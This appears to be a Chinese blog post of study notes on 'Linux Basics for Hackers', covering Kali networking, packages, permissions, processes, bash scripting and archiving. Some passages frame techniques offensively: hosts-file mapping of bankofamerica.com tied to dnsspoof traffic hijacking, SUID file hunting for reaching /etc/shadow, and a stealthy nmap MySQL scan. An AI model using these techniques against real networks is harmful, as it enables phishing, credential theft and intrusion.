<p>​        然后输入 ifconfig 命令并加上接口名称 (hw 表示硬件，ether 表示以太网) 和新的伪造 MAC 地 </p>
<p>​        最后，使用选项 up 备份接口以进行更改。 </p>
<p>例：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">kali</span> &gt;<span class="selector-tag">ifconfig</span>  <span class="selector-tag">eth0</span>  <span class="selector-tag">down</span> </span><br><span class="line"><span class="selector-tag">kali</span> &gt;<span class="selector-tag">ifconfig</span>  <span class="selector-tag">eth0</span>  <span class="selector-tag">hw</span>  <span class="selector-tag">ether</span>  00<span class="selector-pseudo">:11</span><span class="selector-pseudo">:22</span><span class="selector-pseudo">:33</span><span class="selector-pseudo">:44</span><span class="selector-pseudo">:55</span> </span><br><span class="line"><span class="selector-tag">kali</span> &gt;<span class="selector-tag">ifconfig</span>  <span class="selector-tag">eth0</span>  <span class="selector-tag">up</span></span><br></pre></td></tr></table></figure>

<p>dhclient  eth0     从 DHCP服务器分配新的 IP地址</p>
<p>dig hackers-arise.com ns    (nameserver 的缩写）从一个域名服务器获取信息 </p>
<p>在 ADDITIONAL SECTION 部分，dig 查询显示了为 hackers­arise.com 提供服务的 DNS 服务 器的 IP 地址</p>
<p>dig hackers-arise.com mx    获取电子邮件服务器信息</p>
<p>更改DNS服务器</p>
<p>leafpad  /etc/resolv.conf         然后文中添加    nameserver 8.8.8.8 </p>
<p>or</p>
<p>echo  “nameserver  8.8.8.8”  &gt;&gt;  /etc/resolv.conf </p>
<p>（你的机器现在将转到 Google 公共 DNS 服务器来解析域名成 IP 地址。）</p>
<p>映射您自己的IP地址（你可以决定浏览器将访问哪个 IP 地址而不是让 DNS 服务决定）</p>
<p><strong>对于黑客，这对于劫持局域网上的 TCP 连接以使用 dnsspoof 等工具将流量定向到恶意 Web 服务 器非常有用。</strong> </p>
<p>192.168.181.131    bankofamerica.com （在 IP 地址和域名中间请确保你输入的是 TAB 键）</p>
<h2 id="添加或删除软件"><a href="#添加或删除软件" class="headerlink" title="添加或删除软件"></a>添加或删除软件</h2><p>apt-cache search [snort]     搜索软件包</p>
<p>apt-get  install  [snort]    添加软件</p>
<p>apt-get  remove  [snort]    删除软件    （不删除配置文件）</p>
<p>apt-get purge [snort ]    删除软件及其配置文件</p>
<p>apt-get update     更新系统</p>
<p>apt-get upgrade     升级库中的包</p>
<p>​            添加软件仓库到 SOURCES.LIST 文件 ：</p>
<p>​            kali &gt;leafpad  /etc/apt/sources.list </p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb <span class="string">http:</span><span class="comment">//ppa.launchpad.net/webupd8team/java/ubuntu trusty main  </span></span><br><span class="line">deb-src <span class="string">http:</span><span class="comment">//ppa.launchpad.net/webupd8team/java/ubuntu precise main</span></span><br></pre></td></tr></table></figure>

<p>​            其中</p>
<p>​            main     包含受支持的开源软件<br>​            universe     包含社区维护的开源软件<br>​            multiverse     包含受版权或其他法律问题限制的软件<br>​            restricted     包含专有设备驱动程序<br>​            backports     包含来自后续版本的</p>
<p> git clone url</p>
<h2 id="控制文件和目录权限"><a href="#控制文件和目录权限" class="headerlink" title="控制文件和目录权限"></a>控制文件和目录权限</h2><h3 id="权限："><a href="#权限：" class="headerlink" title="权限："></a>权限：</h3><p>必须为每个文件和目录分配使用它的不同身份的特定级别的权限。三个级别的许可如下： </p>
<p>r   读权限。赋予用户打开与查看权限<br>w  写权限。赋予用户查看与编辑写入权限<br>x  执行权限。赋予用户执行一个文件（但是没有必要查看或者编辑它）</p>
<p>通过这种方式，root 用户可以根据用户需要的权限向用户授予一定级别的权限。创建文件时，通常创 建文件的用户是文件的所有者，用户组是用户的当前组。该文件的所有者可以授予它各种访问权限。让我 们看看如何更改权限以将所有权赋予给单个用户和组。 </p>
<p>chown user filename    赋予个人用户权限</p>
<p>chgrp group filename    赋予用户组权限</p>
<h3 id="检查权限-ls-l"><a href="#检查权限-ls-l" class="headerlink" title="检查权限    ls -l"></a>检查权限    ls -l</h3><p>例：</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;ls  –l  /usr/share/hashcat </span><br><span class="line">total<span class="number"> 32952 </span></span><br><span class="line">➊➋         ➌  ➍  ➎ ➏           ➐ </span><br><span class="line">drwxr-xr-x <span class="number"> 5 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 charsets </span><br><span class="line">­rw-r--r-- <span class="number"> 1 </span> root  root<span class="number"> 33685504 </span>June<span class="number"> 28 </span>2018 hashcat.hcstat </span><br><span class="line">­rw-r--r-- <span class="number"> 1 </span> root  root<span class="number"> 33685504 </span>June<span class="number"> 28 </span>2018 hashcat.hctune </span><br><span class="line">drwxr -xr-x<span class="number"> 2 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 masks </span><br><span class="line">drwxr -xr-x<span class="number"> 2 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 OpenCL </span><br><span class="line">drwxr -xr-x<span class="number"> 3 </span> root  root<span class="number"> 4096 </span>Dec<span class="number"> 5 </span>10:47 rules</span><br></pre></td></tr></table></figure>

<p>第一个字符告诉您文件类型，其中 d 代表目录，短划线（ - ）表示文件。<br>下一节定义文件的权限。有三组 三个 字符，由 read（r）， write（w）和 execute（x）的某种组合按顺 序组成。</p>
<p>第一组代表所有者的权限，第二组代表用户所在组的权限以及最后一个，所有其他用户的权限。 </p>
<p>无论您正在查看哪一组三个字母，如果您首先看到 r，该用户或用户组都有权打开和读取该文件或目录。 作为中间字母的 w 意味着它们可以写入（修改）文件或目录，并且最后的 x 意味着它们可以执行（或运行） 文件或目录。如果用短划线（ - ）替换任何 r，w 或 x，则未给出相应的权限。</p>
<table>
<thead>
<tr>
<th>二进制</th>
<th>十进制</th>
<th>权限(rwx)</th>
</tr>
</thead>
<tbody><tr>
<td>000</td>
<td>0</td>
<td>—</td>
</tr>
<tr>
<td>001</td>
<td>1</td>
<td>–x</td>
</tr>
<tr>
<td>010</td>
<td>2</td>
<td>-w-</td>
</tr>
<tr>
<td>011</td>
<td>3</td>
<td>-wx</td>
</tr>
<tr>
<td>100</td>
<td>4</td>
<td>r–</td>
</tr>
<tr>
<td>101</td>
<td>5</td>
<td>r-x</td>
</tr>
<tr>
<td>110</td>
<td>6</td>
<td>rw-</td>
</tr>
<tr>
<td>111</td>
<td>7</td>
<td>rwx</td>
</tr>
</tbody></table>
<p>chmod  774  hashcat.hcsta    更改文件权限（7 文件所有者权限  7 文件所有者所在组权限 4其他所有用户权限 ）</p>
<h3 id="UGO语法："><a href="#UGO语法：" class="headerlink" title="UGO语法："></a>UGO语法：</h3><p>输入 chmod 命令，然后输入要更改权限的用户，为用户提供 u，为组提供 g，为 其他用户提供 o，或者输入三个运算符之一： </p>
<p>-     移除一个权限 </p>
<p>+    添加一个权限 </p>
<p>=    设置一个权限 </p>
<p>在操作符之后，包括要添加或删除的权限（rwx），最后包含要应用它的文件的名称。 </p>
<p>例：</p>
<p>chmod  u-w  hashcat.hcstat         删除用户对 hashcat.hcstat 所属文件的写入权限</p>
<p>chmod u+x, o+x hashcat.hcstat     同时为用户和其他用户（不包括组）授予执行权限</p>
<p>Linux 自动分配基本权限（通常为文件 666 和目录 777）。</p>
<p>umask 方法表示要从文件或目录的基本权限中删除 的权限，以使其更安全。 </p>
<p>当创建新文件或目录时，它权限设置为默认值减去 umask 中的值</p>
<p>与大多数 Debian 系统一样，umask 预先配置为 022，这意味着 Kali 默认值为 644，文件为 755，目录为 755。 </p>
<h3 id="umask"><a href="#umask" class="headerlink" title="umask"></a>umask</h3><p>umask 值对于系统上的所有用户都不是通用的。每个用户都可以为其个人.profile 文件中的文件和目录 设置个人默认 umask 值。要以用户身份登录时查看当前值，只需输入命令 umask 并记下返回的内容。要更 改用户的 umask 值，请编辑该文件/home/username/.profile，例如，添加 umask 007 进行设置，以便只有所有者和用户组的成员才具有权限。 </p>
<h3 id="特别权限："><a href="#特别权限：" class="headerlink" title="特别权限："></a>特别权限：</h3><p>设置用户 ID（或 SUID）， 设置组 ID（或 SGID）</p>
<h4 id="使用-SUID授予临时-root权限"><a href="#使用-SUID授予临时-root权限" class="headerlink" title="使用 SUID授予临时 root权限"></a>使用 SUID授予临时 root权限</h4><p>正如您现在应该知道的那样，用户只有在有权执行该特定文件时才能执行该文件。如果用户只具有读 取和（或）写入权限，则无法执行。这可能看起来很简单，但这条规则有例外。<br>你可能遇到过这样一种情况：文件在被所有用户（即使非 root 用户）执行期间都需要 root 用户的权限。 例如，允许用户更改其密码的文件需要访问/etc/shadow（Linux 中保存用户密码的文件），该文件需要 root 用户权限才能执行。在这种情况下，通过在程序上设置 SUID 位，可以临时授予所有者执行文件所需的特权。<br>基本上，SUID 位表示任何用户都可以使用所有者的权限来执行该文件，但这些权限不会超出使用该文 件的范围。<br>要设置 SUID 位，请在常规权限之前输入 4，因此当设置 SUID 位时，具有 644 的新结果权限的文件表示为 4644</p>
<h4 id="使用-SGID授予-Root用户组权限"><a href="#使用-SGID授予-Root用户组权限" class="headerlink" title="使用 SGID授予 Root用户组权限"></a>使用 SGID授予 Root用户组权限</h4><p>SGID 授予临时权限，但它授予文件所有者组的权限，而不是文件所有者的权限。这意味着，设置 SGID 位，如果用户组有权执行该文件，没有执行权限的人也可以执行文件。<br>应用于目录时，SGID 位的工作方式略有不同：当该位置位时在目录中，在该目录中创建的新文件的所有权将转到目录创建者的组，而不是文件创建者的组。当多个用户共享目录时，这非常有用。该组中的所有用户都可以执行文件，而不仅仅是单个用户。<br>SGID 位在常规权限之前表示为 2，因此当 SGID 位置位时，具有结果权限 644 的新文件将表示为 2644。<br>同样，您可以使用 chmod 命令（例如，chmod 2644 filename） 。 </p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>作为黑客，您可以使用特别权限获取临时 root 权限并执行恶意操作，例如访问/etc/shadow 中的密码。 </p>
<p>在文件系统的任何位置查找对于 root 用户或其他 sysadmin，具有权限 4000（ SUID 位）的文件。</p>
<p>find  /  -user  root  -perm  -4000</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;cd  /usr/bin </span><br><span class="line">kali &gt;ls  -l </span><br><span class="line">­rwxr-xr-x <span class="number">1</span>  root  root  <span class="number">176272</span> Jul <span class="number">18</span> <span class="number">2018</span> stunnel4 </span><br><span class="line">­rwxr-xr-x <span class="number">1</span>  root  root   <span class="number">26696</span> Mar <span class="number">17</span> <span class="number">2018</span> sucrack </span><br><span class="line">➊-rwsr-xr-x <span class="number">1</span>  root root  <span class="number">140944</span> Jul <span class="number">5</span>  <span class="number">2018</span> sudo</span><br></pre></td></tr></table></figure>

<p> 请注意➊，所有者的第一组权限（具有 s 代替 x）。这就是 Linux 表示 SUID 位已设置的方式。这意味着 任何人跑sudo文件具有root用户的权限，这可能是系统管理员的安全问题，也可能是黑客的潜在攻击媒介。 </p>
<h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>查看进程</p>
<p>USER  进程用户<br>PID   进程 id<br>%CPU  CPU 占用率<br>75<br>%MEM  进程 CPU 占用率<br>COMMAND 进程名</p>
<p>通常，要对进程执行任何操作，我们必须指定其 PID。</p>
<p>通过进程名过滤进程</p>
<p>例：    ps  aux  |  grep  msfconsole </p>
<h3 id="top"><a href="#top" class="headerlink" title="top"></a>top</h3><p>按使用的资源排序的进程显示 ，从最大的进程开始。与 ps 命令不同的是，top 命令每 10 秒动态刷新一次列表， 而 ps 命令只提供一次进程快照。</p>
<h3 id="nice"><a href="#nice" class="headerlink" title="nice"></a>nice</h3><p>在运行进程时设置优先级 </p>
<p>例：nice -n  -10  /bin/slowprocess </p>
<p>高 nice 值为低优先级，低 nice 值为高优先级</p>
<p>进程的所有者可以降低进程的 优先级，但不能增加其优先级。当然，超级用户或根用户可以随意将 nice 值设置为他们喜欢的任何值。 </p>
<h3 id="renice"><a href="#renice" class="headerlink" title="renice"></a>renice</h3><p>例：renice  20  [PID]6996             </p>
<p>与 nice 一样，只有 root 用户可以将进程重新设置为负值以赋予其更高的优先级，但任何用户都可以使 用 renice 来降低优先级。 </p>
<h3 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h3><p>命令：kill -signal PID</p>
<p>SIGHUP 1<br>这称为挂起（HUP）标志信号。它会停 止指定的进程并使用相同的PID重新启 动它。<br>SIGINT 2<br>这是中断（INT）信号。这是一个弱信 号，不能保证工作，但它在大多数情 况下都有效。<br>SIGQUIT 3<br>这称为核心转储。它终止进程并将进 程信息保存在内存中，然后将此信息 保存在当前工作目录中的一个名为 core 的文件中。（这样做的原因超出 了本书的范围。）<br>SIGTERM 15<br>这是终止（TERM）信号。这是 kill 命令的默认 kill 信号。<br>SIGKILL 9<br>这是强制终止信号。它通过将进程的 资源发送到特殊位置/dev/null 来强 制进程停止。<br>使</p>
<p>如果您不知道进程的 PID，则可以使用 killall 命令终止进程。此命令将进程的名称（而不是 PID）作为参 数。</p>
<h3 id="在后台运行进程"><a href="#在后台运行进程" class="headerlink" title="在后台运行进程"></a>在后台运行进程</h3><p>要在后台启动进程，只需在命令末尾添加一个与号（＆），</p>
<p>例:    leafpad  newscript  &amp; </p>
<h3 id="把后台运行的进程移到前台"><a href="#把后台运行的进程移到前台" class="headerlink" title="把后台运行的进程移到前台"></a>把后台运行的进程移到前台</h3><p>命令：fg PID</p>
<h3 id="定时执行程序"><a href="#定时执行程序" class="headerlink" title="定时执行程序"></a>定时执行程序</h3><p><strong>at</strong></p>
<p>当您使用指定的时间进入 at 守护进程时，进入交互模式时，您会看到 at&gt;提示符。您可以在此处输入 要在指定时间执行的命令： </p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;<span class="keyword">at</span>  <span class="number">7</span>:<span class="number">20</span>am </span><br><span class="line"><span class="keyword">at</span> &gt;/root/myscanningscript</span><br></pre></td></tr></table></figure>

<p>at 命令是守护进程（后台进程）对于将作业安排在将来的某个时刻运行一次非常有用。</p>
<p>crond 更适合于 安排任务每天，每周或每月发生。</p>
<h3 id="管理用户环境变量"><a href="#管理用户环境变量" class="headerlink" title="管理用户环境变量"></a>管理用户环境变量</h3><p>env    查看所有默认环境变量</p>
<p>set | more     要查看所有环境变量，包括 shell 变量、本地变量和 shell 函数(如任何用户定义的变量和命令别名)</p>
<p>set | grep HISTSIZE     特定变量的过滤</p>
<p>HISTSIZE=0     暂时更改会话的变量值</p>
<p>export HISTSIZE     永久更改会话的变量值（更改后 export）</p>
<p>找点乐子：</p>
<p>​        PS1=”World’s Best Hacker: #” </p>
<p>​        export PS1 </p>
<p>PS1 变量有一组占位符，用于显示希 望在提示符中显示的信息，包括以下内容: \u  当前用户的名称 \h  主机名 \W  当前工作目录的基本名称 </p>
<h3 id="添加到PATH变量"><a href="#添加到PATH变量" class="headerlink" title="添加到PATH变量"></a>添加到PATH变量</h3><p>PATH=$PATH:/root/newhackingtool </p>
<h3 id="创建用户定义的变量"><a href="#创建用户定义的变量" class="headerlink" title="创建用户定义的变量"></a>创建用户定义的变量</h3><p>语法很简单：输入变量的名称，后面跟着赋值符号(=)，然后输入变量的值，如下所示: </p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;MYNEWVARIABLE=<span class="comment">"Hacking is the most valuable skill set in the 21st century</span></span><br><span class="line">kali &gt;<span class="keyword">echo</span> $MYNEWVARIABLE </span><br><span class="line">Hacking <span class="keyword">is</span> the most valuable skill <span class="keyword">set</span> in the <span class="number">21</span><span class="keyword">st</span> century</span><br></pre></td></tr></table></figure>

<p>就像我们的系统环境变量一样，必须导出用户定义的变量才能将其持久化到新的会话中。 </p>
<p>如果要删除这个新变量或任何变量，请使用 unset 命令。不过，在删除系统变量之前一定要三思，因 为之后系统的操作可能会大不相同。 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;<span class="built_in">unset</span> MYNEWVARIABLE </span><br><span class="line">kali &gt;<span class="built_in">echo</span> <span class="variable">$MYNEWVARIABLE</span> </span><br><span class="line">kali &gt;</span><br></pre></td></tr></table></figure>

<p>如您所见，当您输入 unset  MYNEWVARIABLE 时，您将删除该变量及其值。如果在同一个变量上使用 echo，Linux 现在将返回空行。</p>
<h2 id="简单BASH-脚本编程"><a href="#简单BASH-脚本编程" class="headerlink" title="简单BASH 脚本编程"></a>简单BASH 脚本编程</h2><p>#!        告诉您的操作系统您想为脚本使用哪个解释器。</p>
<p>然后按照指示的 (#!/bin/bash)操作系统使用 bash shell 解释器。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➊ <span class="comment">#! /bin/bash </span></span><br><span class="line"> </span><br><span class="line">➋ <span class="comment"># This is your second bash script. In this one, you prompt /  </span></span><br><span class="line"><span class="comment"># the user for input, place the input in a variable, and / </span></span><br><span class="line"><span class="comment"># display the variable contents in a string. </span></span><br><span class="line"> </span><br><span class="line">➌ <span class="built_in">echo</span> <span class="string">"What is your name?"</span>  </span><br><span class="line"><span class="built_in">read</span> name </span><br><span class="line">➍ <span class="built_in">echo</span> <span class="string">"What chapter are you on in Linux Basics for Hackers?"</span>  </span><br><span class="line"><span class="built_in">read</span> chapter </span><br><span class="line">➎ <span class="built_in">echo</span> <span class="string">"Welcome"</span> <span class="variable">$name</span> <span class="string">"to Chapter"</span> <span class="variable">$chapter</span> <span class="string">"of Linux Basics for Hackers!"</span></span><br></pre></td></tr></table></figure>

<p>我们从#!/bin/bash 开始，告诉系统要使用这个脚本➊bash 解释器。然后添加一个注释描述脚本➋及其 功能。之后,我们提示用户输入他们的名字，➌问解释器我们的名字，读取输入并将其转换成一个变量 name。 然后我们提示用户输入他们目前正在这本书中的所在章节，➍我们再次读取键盘输入一个变量，这个章节 叫 chapter。<br>在最后一行中，我们构造一个输出字符串，➎欢迎读者（他们的名字）在此书的所在章节。我们使用 echo 命令，并用双引号提供要在屏幕上显示的文本。然后，为了填写用户输入的名称和章号，我们将变量 添加到消息中应该出现的位置。如第 7 章所述，要使用变量中包含的值，必须在变量名前面加上$符号。<br>将此文件保存为 WelcomeScript.sh 文件。其中.sh 扩展名是脚本文件的约定。您可能已经注意到，我们 没有包含前面的扩展名，这并不是严格要求的，如果您关闭扩展名，该文件将默认保存为 shell 脚本文件。<br>现在，让我们运行这个脚本。不要忘记先用 chmod 给其执行权限</p>
<p>nmap:</p>
<p>nmap  -sT  192.168.181.1  -p  3306     对地址 192.168.181.1 执行 TCP 扫描，查看端口 3306 (MySQL 的默认端口)是否打开， </p>
<h3 id="一个简单的扫描器"><a href="#一个简单的扫描器" class="headerlink" title="一个简单的扫描器"></a>一个简单的扫描器</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➊ #! /bin/bash </span><br><span class="line">➋ # This<span class="built_in"> script </span>is designed <span class="keyword">to</span> <span class="builtin-name">find</span> hosts with MySQL installed </span><br><span class="line">nmap ➌-sT 192.168.181.0/24 ➍-p 3306 ➎&gt;/dev/<span class="literal">null</span> ➏-oG MySQLscan </span><br><span class="line">➐ cat MySQLscan | grep open &gt; MySQLscan2 ➑ </span><br><span class="line"> </span><br><span class="line">cat MySQLscan2</span><br></pre></td></tr></table></figure>

<p>➊我们使用标识符#！开始。➋让我们遵循这个注释来解释脚本的用途。<br>现在，让我们使用➌nmap 命令 TCP 扫描局域网，寻找端口 3306➍。(请注意，您的 IP 地址在您的终端 中可能不同，请使用 Linux 上的 ifconfig 命令或 Windows 上的 ipconfig 命令来确定您的 IP 地址。) 为了保持 隐秘，我们还发送通常会出现在屏幕上的标准 nmap 输出到 Linux 的一个特殊的地方➎，一个特殊的地方在 Linux 中消失。我们在本地机器上做这个，所以这并不重要，但如果要远程使用脚本，则需要隐藏 nmap 输 出。然后，我们将扫描的输出发送到一个名为 MySQLscan 的文件➏，格式为 grep 格式，这意味着 grep 可以 处理的格式。 </p>
<p>下一行显示我们存储输出的 MySQLscan 文件，➐然后输出到 grep 的管道，以过滤包含关键字 open（端 口开放）的所在行。然后我们把这些字符行放到一个命名为 MySQLscan2 的文件中➑。 </p>
<h4 id="注：这里只对bash进行简单的介绍。"><a href="#注：这里只对bash进行简单的介绍。" class="headerlink" title="注：这里只对bash进行简单的介绍。"></a>注：这里只对bash进行简单的介绍。</h4><p>内置 Bash 命令<br>命令    功能<br>：     返回 0 或 true<br>.     执行 shell 脚本<br>b     将作业放在后台<br>break     退出当前循环<br>cd     改变目录<br>continue     执行当前循环<br>echo     显示命令参数<br>eval     计算以下表达式<br>exec     在不创建新进程的情况下执行以下命令<br>exit     退出 shell<br>export     使变量或函数对其他程序可用<br>fg     将工作放在前台<br>getopts     解析 shell 脚本的参数<br>jobs     列出后台(bg)执行的工作<br>Pwd     显示当前目录<br>Read     从标准输入读取一行<br>Readonly     将变量声明为只读<br>set     列出所有变量<br>shift     将参数向左移动<br>test     评估参数<br>[     执行条件测试<br>times     打印用户和系统时间<br>trap     追踪一个信号<br>type     显示如何将每个参数解释为一个命令<br>umask     更改新文件的默认权限<br>unset     从变量或函数中删除值<br>wait     等待后台进程完成</p>
<h2 id="压缩和归档"><a href="#压缩和归档" class="headerlink" title="压缩和归档"></a>压缩和归档</h2><h3 id="归档"><a href="#归档" class="headerlink" title="归档"></a>归档</h3><p>tar  -cvf  HackersArise.tar  hackersarise1  hackersarise2  hackersarise3 </p>
<p>归档命令是 tar，我们在这里使用它有三个参数选项。c 选项表 示创建，v(代表详细过程，是可选的)列出 tar 正在处理的文件，f 表示写入以下一个文件。最后一个选项也 适用于从文件中读取。然后，我们为新归档文件提供您希望从这三个脚本来创建的文件名:HackersArise.tar。</p>
<p>tar  -tvf  HackersArise.tar         使用 tar 命令和-t 内容列表参数从 tar 包中显示这些文件，而不需要提取它们，</p>
<p>tar  -xvf  HackersArise.tar         使用 tar 命令和-x (extract)选项从 tar 包中提取这些文件</p>
<h3 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h3><p>​                        </p>
<table>
<thead>
<tr>
<th>压缩方式</th>
<th>压缩文件</th>
<th>解压文件</th>
</tr>
</thead>
<tbody><tr>
<td>• bzip2，它使用扩展名.tar.bz2</td>
<td>bzip2  HackersArise.*</td>
<td>bunzip2  HackersArise.*</td>
</tr>
<tr>
<td>• compress，它使用扩展名.tar.Z</td>
<td>compress  HackersArise.*</td>
<td>uncompress  HackersArise.*</td>
</tr>
<tr>
<td>• gzip，它使用扩展名.tar.gz 或.tgz</td>
<td>gzip  HackersArise.*</td>
<td>gunzip  HackersArise.*</td>
</tr>
</tbody></table>
<h3 id="创建存储设备的逐位或物理副本"><a href="#创建存储设备的逐位或物理副本" class="headerlink" title="创建存储设备的逐位或物理副本"></a>创建存储设备的逐位或物理副本</h3><p>dd 命令的基本语法如下: </p>
<p>dd if=inputfile of=outputfile </p>
<p>dd 是指定输入文件的物理“复制”命令，</p>
<p>/dev/sdb 表示指定输出文件的/dev 目录下的闪存驱动器，</p>
<p>/root/flashcopy 是要将物理副本复制到的文件的名称</p>
<p>dd  if=/dev/media  of=/root/flashcopy  bs=4096  conv:noerror</p>
<p>dd 命令可以使用许多参数选项，您可以对这些选项进行一些研究，但其中最有用的是 noerror 选项和 bs(块大小)选项。顾名思义，即使遇到错误，noerror 选项也会继续复制。bs 选项允许您确定要复制的数 据的块大小(每个块的读/写字节数)。默认情况下，它被设置为 512 字节，但是可以更改它以加快进度。通 常，这将设置为设备的扇区大小，通常为 4KB(4096 字节)。</p>
<h2 id="文件系统和存储设备管理"><a href="#文件系统和存储设备管理" class="headerlink" title="文件系统和存储设备管理"></a>文件系统和存储设备管理</h2><h3 id="设备目录-DEV"><a href="#设备目录-DEV" class="headerlink" title="设备目录/DEV"></a>设备目录/DEV</h3><p>Linux 有一个特殊的目录，其中包含代表每个附加设备的文件：适当命名的/dev 目录。</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;cd  /dev </span><br><span class="line">kali &gt;ls  -l total<span class="number"> 0 </span></span><br><span class="line">crw-------<span class="number"> 1 </span>root root 10,175 May<span class="number"> 16 </span>12:44 agpgart </span><br><span class="line">crw-------<span class="number"> 1 </span>root root 10,235 May<span class="number"> 16 </span>12:44 autofs </span><br><span class="line">drwxr-xr-x  <span class="number"> 1 </span> root root<span class="number"> 160 </span>May<span class="number"> 16 </span>12:44 block </span><br><span class="line">­­snip-- </span><br><span class="line">lrwxrwxrwx  <span class="number"> 1 </span> root root<span class="number"> 3 </span>May<span class="number"> 16 </span>12:44 cdrom -&gt; sr0 </span><br><span class="line">­­snip-- </span><br><span class="line">drwxr-xr-x  <span class="number"> 2 </span> root root<span class="number"> 60 </span>May<span class="number"> 16 </span>12:44 cpu </span><br><span class="line">­­snip--</span><br></pre></td></tr></table></figure>

<p>使用带有 fdisk 的-l 参数列出所有驱动器的所有分区，</p>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">kali &gt;fdisk  -l </span><br><span class="line">Disk /dev/sda: 20GiB,<span class="number"> 21474836480 </span>bytes,<span class="number"> 41943040 </span>sectors  </span><br><span class="line">108 </span><br><span class="line">Units: sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes </span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes  </span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes </span><br><span class="line">  </span><br><span class="line">Disk label type: dos </span><br><span class="line">Disk identifier: 0x7c06cd70 </span><br><span class="line"> </span><br><span class="line">Device Boot Start End   Sectors Size Id Type </span><br><span class="line">/dev/sda1 *<span class="number"> 2048 </span>39174143<span class="number"> 39172096 </span>18.7G<span class="number"> 83 </span>Linux </span><br><span class="line">/dev/sda2<span class="number"> 39176190 </span><span class="number"> 41940991 </span> <span class="number"> 2764802 </span>1.3G<span class="number"> 5 </span>Extended </span><br><span class="line">/dev/sda5<span class="number"> 39176192 </span><span class="number"> 41940991 </span> <span class="number"> 2764800 </span>1.3G<span class="number"> 82 </span>Linux swap / Solaris </span><br><span class="line"> </span><br><span class="line">Disk /dev/sdb: 29.8 GiB,<span class="number"> 31999393792 </span>bytes,<span class="number"> 62498816 </span>sectors </span><br><span class="line">Units: sectors of<span class="number"> 1 </span>*<span class="number"> 512 </span>=<span class="number"> 512 </span>bytes </span><br><span class="line">Sector size (logical/physical):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes  </span><br><span class="line">I/O size (minimum/optimal):<span class="number"> 512 </span>bytes /<span class="number"> 512 </span>bytes Disk label type: dos </span><br><span class="line">Disk identifier: 0xc3072e18 </span><br><span class="line"> </span><br><span class="line">Device Boot  Start End Sectors Size Id Type </span><br><span class="line">/dev/sdb1<span class="number"> 32 </span>62498815<span class="number"> 62498784 </span>29.8G<span class="number"> 7 </span>HPFS/NTFS/exFAT</span><br></pre></td></tr></table></figure>

